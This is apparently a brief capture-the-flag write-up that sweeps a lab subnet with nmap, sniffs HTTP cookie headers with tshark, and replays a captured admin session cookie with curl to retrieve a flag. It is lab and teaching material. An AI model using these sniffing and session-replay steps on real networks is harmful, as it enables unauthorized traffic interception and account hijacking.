# Sniffing Cookies

#### First start by finding the open hosts using nmap:
```nmap -sn -n -v -T5 --min-rate 1000 10.0.0.0/16 | grep -B 1 "Host is up"```

-------------------------------------

#### Only 10.0.0.2 came back up, need to tshark for the packets to find the cookie:
```tshark -i 1 -f "host 10.0.0.2" -Y "http.cookie or http.set_cookie" -T fields -e http.cookie -e http.set_cookie -l```

----------------------------------

#### Then just curl for the flag:
```curl -s -b "session=eyJ1c2VyIjoiYWRtaW4ifQ.aQqIUQ._-dfvVFkh2FRjrLsykBuRtJdTOs" http://10.0.0.2/flag```
